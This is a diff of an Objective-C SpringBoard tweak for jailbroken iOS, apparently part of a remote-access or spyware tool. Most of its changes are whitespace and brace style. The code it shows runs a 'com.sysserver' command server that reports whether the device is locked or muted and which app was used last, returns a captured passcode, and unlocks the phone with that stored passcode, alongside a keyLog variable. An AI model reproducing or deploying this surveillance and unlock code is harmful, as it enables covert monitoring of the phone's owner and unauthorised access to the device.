@@ -7,19 +7,19 @@ SBMediaController *mediaController;
 NSString *passcode;
 NSString *keyLog;
 
+
 -(void)applicationDidFinishLaunching:(id)application {
-	%orig;
-	mediaController = (SBMediaController *)[%c(SBMediaController) sharedInstance];
-	CPDistributedMessagingCenter *messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.sysserver"];
-	[messagingCenter runServerOnCurrentThread];
-	[messagingCenter registerForMessageName:@"commandWithNoReply" target:self selector:@selector(commandWithNoReply:withUserInfo:)];
-	[messagingCenter registerForMessageName:@"commandWithReply" target:self selector:@selector(commandWithReply:withUserInfo:)];
+    %orig;
+    mediaController = (SBMediaController *)[%c(SBMediaController) sharedInstance];
+    CPDistributedMessagingCenter *messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.sysserver"];
+    [messagingCenter runServerOnCurrentThread];
+    [messagingCenter registerForMessageName:@"commandWithNoReply" target:self selector:@selector(commandWithNoReply:withUserInfo:)];
+    [messagingCenter registerForMessageName:@"commandWithReply" target:self selector:@selector(commandWithReply:withUserInfo:)];
 }
 
 %new
 -(void)commandWithNoReply:(NSString *)name withUserInfo:(NSDictionary *)userInfo {
 	NSString *command = [userInfo objectForKey:@"cmd"];
-	// Button Simulation
 	if ([command isEqual:@"home"]) {
 		if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonSinglePressUp)]) {
 			[(SBUIController *)[%c(SBUIController) sharedInstance] handleHomeButtonSinglePressUp];
@@ -70,27 +70,23 @@ NSString *keyLog;
 		else 
 			result = @"We have not obtained passcode yet";
 		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
-	}
-	else if ([command isEqual:@"lastapp"]) {
+	}else if ([command isEqual:@"lastapp"]) {
 		SBApplicationIcon *iconcontroller = [(SBIconController *)[%c(SBIconController) sharedInstance] lastTouchedIcon];
 		if (NSString *lastapp = iconcontroller.nodeIdentifier)
 			return [NSDictionary dictionaryWithObject:lastapp forKey:@"returnStatus"];
 		return [NSDictionary dictionaryWithObject:@"none" forKey:@"returnStatus"];
-	}
-	else if ([command isEqual:@"islocked"]) {
+	}else if ([command isEqual:@"islocked"]) {
 		if ([(SBLockScreenManager *)[%c(SBLockScreenManager) sharedInstance] isUILocked])  
 			return [NSDictionary dictionaryWithObject:@"true" forKey:@"returnStatus"];
 		return [NSDictionary dictionaryWithObject:@"false" forKey:@"returnStatus"];
-	}
-	else if ([command isEqual:@"ismuted"]) {
+    }else if ([command isEqual:@"ismuted"]) {
 		NSString *result = @"";
 		if (mediaController.ringerMuted)
 			result = @"muted";
 		else
 			result = @"unmuted";
 		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
-	}
-	else if ([command isEqual:@"unlock"]) {
+	}else if ([command isEqual:@"unlock"]) {
 		NSString *result = @"";
 		if (passcode != NULL)
 			[(SBLockScreenManager *)[%c(SBLockScreenManager) sharedInstance] attemptUnlockWithPasscode:passcode];
